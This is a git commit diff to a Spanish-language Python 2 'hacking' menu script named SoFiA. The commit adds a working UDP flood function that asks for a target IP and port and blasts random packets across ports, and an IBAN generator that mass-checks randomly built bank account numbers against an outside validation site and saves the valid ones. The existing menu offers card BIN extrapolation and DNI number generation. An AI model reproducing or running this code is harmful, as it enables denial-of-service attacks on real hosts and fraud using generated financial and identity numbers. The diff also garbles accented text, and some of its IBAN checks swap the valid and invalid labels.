7db4fef886764ade77b7b45a6fd10999e184c5de
Joshua Salcido <52334655+tavaresjoshua8@users.noreply.github.com>
2019-08-02 00:47:35 -0600

    Update main.py

--- main.py
+++ main.py
@@ -3,7 +3,13 @@ import re
 import time 
 import sys
 import os
+import socket
+import random
+import requests
+import string
+import thread
 from random import randint
+from datetime import datetime
 version = ' 1.9.1'
 time.sleep(0.5)
 execute = os.system
@@ -12,11 +18,11 @@ def correctRead(number, bin):
     read = 0
     while True:
         try:
-            read = (input('  Introduce el dígito número ' + number + ' del ' + bin + ' Bin: '))
+            read = (input('  Introduce el dÃ­gito nÃºmero ' + number + ' del ' + bin + ' Bin: '))
             if read >= 0 and read <= 9:
                 break
             else:
-                print('   Valor inválido')
+                print('   Valor invÃ¡lido')
         except Exception:
             print('   UN NUMERO')
     return read
@@ -73,8 +79,10 @@ def dniGenerator():
     dni=range(1,9)
     print("   Emmanuel Milos|Emilio Barroso|Joshua Salcido")
     i=0
-    for element in dni:
-        element=randint(1,9)
+    while i<len(dni):
+        for element in dni:
+           dni[i]=randint(1,9)
+        i+=1
     dni2=''.join(map(str,dni))
     print ' '
     time.sleep(2)
@@ -94,13 +102,146 @@ def dniGenerator():
     raw_input("  Presiona Enter Para Salir De El Generador")
     print("")
 
+def ddos():
+    execute("title DDOS")
+    execute("color 6")
+    execute("cls")
+    now = datetime.now()
+    hour = now.hour
+    minute = now.minute
+    day = now.day
+    month = now.month
+    year = now.year
+    ##############
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    bytes = random._urandom(1490)
+    #############
+    execute("cls")
+    execute('color 5')
+    print '''
+    _  _  _  __    _ ______ _  __   
+    | \| \/ \(_    |_| |  | |_|/  |/ 
+    |_/|_/\_/__)   | | |  | | |\__|\ 
+                                                          
+    '''
+    ip = raw_input("IP Target : ")
+    port = input("Port       : ")
+    execute("cls")
+    execute("echo INICIANDO ATAQUE! ")
+    print "[                    ] 0% "
+    time.sleep(5)
+    print "[=====               ] 25%"
+    time.sleep(5)
+    print "[==========          ] 50%"
+    time.sleep(5)
+    print "[===============     ] 75%"
+    time.sleep(5)
+    print "[====================] 100%"
+    time.sleep(3)
+    sent = 0
+    while True:
+         sock.sendto(bytes, (ip,port))
+         sent = sent + 1
+         port = port + 1
+         print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
+         if port == 65534:
+            port = 1
+            break
+
+def iban():
+    execute("title LAST")
+    execute("color 8")
+    execute("cls")
+    logs1 = '''
+     ___ ____    _    _   _        ____ _____ _   _ 
+    |_ _| __ )  / \  | \ | |      / ___| ____| \ | |
+    || ||  _ \ / _ \ |  \| |_____| |  _|  _| |  \| |
+    || || |_) / ___ \| |\  |_____| |_| | |___| |\  |
+    |___|____/_/   \_\_| \_|      \____|_____|_| \_|                                               
+    \n[$] BOG IBAN GEN/VALIDATOR.
+    [$] https://www.Bogpro.com/
+    '''
+    print logs1
+    print '[X] ESCOGE EL PAIS [GERMANY[DE]/FRANCE[FR]/SPAIN[ES]/ITALIA[IT]].'
+    print ''
+    iban_co = raw_input('[X] ENTER YOUR IBAN COUNTRY NAME OR CODE X> ')
+    if str(iban_co) == 'DE' or str(iban_co) == 'GERMANY':
+        # //DE IBAN
+        def de_chk(a, ab):
+            de_iban = 'DE'+str(random.randint(00,99))+'50010517'+str(random.randint(0000000000,9999999999))
+            chk_req = requests.post('https://check-iban.com/proxy.php?iban='+de_iban)
+            if 'Diese IBAN ist nicht korrekt.' in chk_req.content:
+                print '[-] INVALID GERMANY IBAN [ '+de_iban+' ].'
+                pass
+            elif 'Diese IBAN ist formal korrekt.' in chk_req.content:
+                print '[+] VALID GERMANY IBAN [ '+de_iban+' ].'
+                with open('VALID_DE.txt','a+') as f:
+                    f.write('[+] VALID GERMANY IBAN [ '+de_iban+' ].')
+                    f.close()
+            else:
+                print '[%] UNKNOWN GERMANY IBAN [ '+de_iban+' ].'
+        while 1:
+            thread.start_new_thread(de_chk, ('logs1', 10))
+            time.sleep(0.25)
+
+    elif str(iban_co) == 'FR' or str(iban_co) == 'FRANCE':
+        # //FR IBAN
+        def fr_chk(a, ab):
+            fr_iban = 'FR'+str(random.randint(00,99))+'30066'+str(random.randint(000000000000000000,999999999999999999))
+            chk_req = requests.post('https://check-iban.com/proxy.php?iban='+fr_iban)
+            if 'This is a valid IBAN.' in chk_req.content:
+                print '[-] INVALID FRANCE IBAN [ '+fr_iban+' ].'
+                pass
+            else:
+                print '[+] VALID FRANCE IBAN [ '+fr_iban+' ].'
+                with open('VALID_FR.txt','a+') as f:
+                    f.write('[+] VALID FRANCE IBAN [ '+fr_iban+' ].')
+                    f.close()
+        while 1:
+            thread.start_new_thread(fr_chk, ('logs1', 10))
+            time.sleep(0.25)
+
+    elif str(iban_co) == 'ES' or str(iban_co) == 'SPAIN':
+        # //ES IBAN
+        def es_chk(a, ab):
+            es_iban = 'ES'+str(random.randint(0000000000000000000000,9999999999999999999999))
+            chk_req = requests.post('https://check-iban.com/proxy.php?iban='+es_iban)
+            if 'This is a valid IBAN.' in chk_req.content:
+                print '[+] VALID SPAIN IBAN [ '+es_iban+' ].'
+                with open('VALID_ES.txt','a+') as f:
+                    f.write('[+] VALID SPAIN IBAN [ '+es_iban+' ].')
+                    f.close()
+            else:
+                print '[-] INVALID SPAIN IBAN [ '+es_iban+' ].'
+                pass
+        while 1:
+            thread.start_new_thread(es_chk, ('logs1', 10))
+            time.sleep(0.25)
+
+    elif str(iban_co) == 'IT' or str(iban_co) == 'ITALY':
+        # //IT IBAN
+        def it_chk(a, ab):
+            it_iban = 'IT'+str(random.randint(00,99))+''.join(random.choice(string.ascii_uppercase) for _ in range(1))+'0300203280'+str(random.randint(000000000000,999999999999))
+            chk_req = requests.post('https://check-iban.com/proxy.php?iban='+it_iban)
+            if 'This is a valid IBAN.' in chk_req.content:
+                print '[-] VALID ITALY IBAN [ '+it_iban+' ].'
+                with open('VALID_IT.txt','a+') as f:
+                    f.write('[+] VALID ITALY IBAN [ '+it_iban+' ].')
+                    f.close()
+            else:
+                print '[+] INVALID ITALY IBAN [ '+it_iban+' ].'
+                pass
+        while 1:
+            thread.start_new_thread(it_chk, ('logs1', 10))
+            time.sleep(0.25)    
+    else:
+        # //OUT PUT
+        print '[*]  PORFAVOR ESCRIBE UN PAIS O CODIGO DE PAIS VALIDO.'
+
 def bye():
     print ("Gracias por Utlizar SoFiA")
     exit()
 
-def defaul():
-    print('En Construcción!')
-    exit()
 ols = time.strftime("%H:%M:%S")
 print time.strftime("                     %I:%M:%S") 
 if ols > "23:30":
@@ -127,14 +268,18 @@ while True:
     print("      .:MENU:.")
     print("   1.EXTRAPOLADOR")
     print("   2.GENERADOR DE DNI")
-    print("   3.SALIR")
+    print("   3.ATAQUE DDOS")
+    print("   4.IBAN GEN/CHECK[BETA][INESTABLE]")
+    print("   5.Salir")
     print("")
     option = input("  Digite el numero de la optionion: ")
     print("")
     switcher = {
         1: extrapolador,
         2: dniGenerator,
-        3: bye
+        3: ddos,
+        4: iban,
+        5: bye
     }
     func = switcher.get(option, exit)
     func()
